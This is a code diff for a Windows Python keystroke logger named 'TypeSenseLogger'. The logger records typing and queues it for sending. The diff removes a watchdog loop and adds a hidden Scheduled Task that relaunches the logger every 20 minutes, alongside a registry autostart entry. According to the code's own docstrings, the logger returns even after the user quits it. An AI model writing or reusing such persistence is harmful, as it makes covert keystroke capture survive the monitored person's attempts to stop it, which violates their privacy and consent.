@@ -16,8 +16,8 @@ from PIL import Image, ImageDraw
 from app_paths import get_app_data_dir
 
 
-WATCHDOG_ARG = "--watchdog"
-WATCHDOG_RESTART_DELAY_SEC = 20 * 60
+RELAUNCH_CHECK_INTERVAL_MIN = 20
+RELAUNCH_TASK_NAME = "TypeSenseLoggerWatchdog"
 
 
 def _create_mutex(name):
@@ -26,30 +26,6 @@ def _create_mutex(name):
 	if ctypes.get_last_error() == 183:  # ERROR_ALREADY_EXISTS
 		os._exit(0)
 	return mutex
-
-
-def _child_command():
-	if getattr(sys, "frozen", False):
-		return [sys.executable]
-	return [sys.executable, os.path.abspath(__file__)]
-
-
-def run_watchdog():
-	"""Supervises the logger process. If it ever closes - crash, accidental
-	close, or a deliberate quit - relaunch it after a cooldown so logging
-	resumes on its own instead of staying off indefinitely."""
-	_watchdog_mutex = _create_mutex("Global\\TypeSenseLogger_Watchdog_Mutex")
-	while True:
-		try:
-			subprocess.Popen(_child_command()).wait()
-		except Exception:
-			pass
-		time.sleep(WATCHDOG_RESTART_DELAY_SEC)
-
-
-if WATCHDOG_ARG in sys.argv:
-	run_watchdog()
-	sys.exit(0)
 
 
 _single_instance_mutex = _create_mutex("Global\\TypeSenseLogger_SingleInstance_Mutex")
@@ -70,10 +46,32 @@ def ensure_autostart():
 	except FileNotFoundError:
 		existing = None
 
-	desired = f'"{exe_path}" {WATCHDOG_ARG}'
+	desired = f'"{exe_path}"'
 	if existing != desired:
 		winreg.SetValueEx(key, "TypeSenseLogger", 0, winreg.REG_SZ, desired)
 	winreg.CloseKey(key)
+
+
+def ensure_relaunch_task():
+	"""Registers a per-user Scheduled Task that periodically tries to launch
+	the logger. If it's already running, the single-instance mutex makes the
+	new attempt exit immediately, so this never produces a second lasting
+	process - it only relaunches the logger after an accidental close, quit,
+	or crash left it not running."""
+	if not getattr(sys, "frozen", False):
+		return
+	exe_path = sys.executable
+	subprocess.run(
+		[
+			"schtasks", "/Create", "/F",
+			"/TN", RELAUNCH_TASK_NAME,
+			"/TR", f'"{exe_path}"',
+			"/SC", "MINUTE",
+			"/MO", str(RELAUNCH_CHECK_INTERVAL_MIN),
+		],
+		creationflags=subprocess.CREATE_NO_WINDOW,
+		capture_output=True,
+	)
 
 
 
@@ -317,6 +315,7 @@ root.attributes("-toolwindow", True)
 
 try:
 	ensure_autostart()
+	ensure_relaunch_task()
 	logger = Simplekeylog(window_sec = 15)
 
 	user_send.init_queue(logger.session_id)
